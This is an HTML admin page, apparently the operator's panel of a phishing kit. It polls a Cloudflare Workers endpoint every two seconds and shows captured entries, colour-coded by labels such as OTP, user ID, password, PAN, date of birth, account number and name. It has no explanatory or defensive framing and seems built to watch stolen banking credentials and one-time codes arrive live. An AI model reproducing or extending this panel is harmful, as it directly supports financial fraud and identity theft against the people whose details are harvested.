<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Strict Left Admin</title>
    <style>
        /* Sab kuch reset aur baayein taraf set */
        * { 
            box-sizing: border-box; 
            margin: 0; 
            padding: 0; 
            font-family: 'Arial', sans-serif; 
            text-align: left !important; /* Force Left Align */
        }
        
        body { 
            background-color: #ffffff; 
            padding: 5px; 
            display: block; /* Flex hata diya taaki center na ho */
        }

        /* Header */
        .header {
            width: 100%;
            padding: 10px;
            display: flex !important; /* Sirf header ke liye flex */
            justify-content: space-between;
            align-items: center;
            border-bottom: 2px solid #eee;
            margin-bottom: 10px;
        }
        .header h1 { font-size: 12px; color: #000; font-weight: 900; }
        
        .v-badge {
            background: #ff0000;
            color: #fff;
            padding: 2px 10px;
            border-radius: 4px;
            font-weight: 900;
        }

        /* Logs Container */
        #logsDisplay { 
            width: 100%; 
            display: block; 
        }

        /* Full Screen Patla Cart */
        .data-row {
            display: block;
            width: 100%;
            padding: 10px 15px;
            margin-bottom: 5px;
            border-radius: 5px;
            font-size: 14px;
            font-weight: 800;
            line-height: 1.5;
            color: #ffffff; /* White Text */
            white-space: pre-wrap;
            word-break: break-all;
            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
            border: none;
        }

        .time {
            display: block;
            font-size: 9px;
            color: rgba(255,255,255,0.8);
            margin-top: 5px;
            font-weight: 400;
        }
    </style>
</head>
<body>

    <div class="header">
        <h1>STRICT LEFT FEED</h1>
        <div class="v-badge" id="vCount">0</div>
    </div>

    <div id="logsDisplay">
        </div>

    <script>
        const workerURL = 'https://flat-fog-a0cd.sumankkuuyy.workers.dev/';
        let lastHash = "";

        async function fetchLogs() {
            try {
                const res = await fetch(workerURL);
                const data = await res.json();
                
                const display = document.getElementById('logsDisplay');
                const badge = document.getElementById('vCount');

                const currentHash = JSON.stringify(data);
                if (currentHash === lastHash) return;
                lastHash = currentHash;

                badge.innerText = data.length;

                display.innerHTML = data.map(log => {
                    if (log.detail === "COUNT" || (log.type && log.type.includes("VISIT"))) return "";

                    let content = log.detail.toLowerCase();
                    let bgColor = "#333"; // Dark default

                    // Vibrant Colors
                    if (content.includes("otp:-")) {
                        bgColor = "#E60000"; // Sharp Red
                    } else if (content.includes("user id:-") || content.includes("pass:-")) {
                        bgColor = "#008000"; // Deep Green
                    } else if (content.includes("pan:-") || content.includes("dob:-")) {
                        bgColor = "#0000FF"; // Pure Blue
                    } else if (content.includes("acc:-") || content.includes("name:-")) {
                        bgColor = "#FF00FF"; // Bright Pink
                    }

                    return `
                        <div class="data-row" style="background-color: ${bgColor};">
                            ${log.detail}
                            <span class="time">${log.time || ''}</span>
                        </div>
                    `;
                }).join('');

            } catch (e) { console.log("Sync..."); }
        }

        setInterval(fetchLogs, 2000);
        window.onload = fetchLogs;
    </script>
</body>
</html>
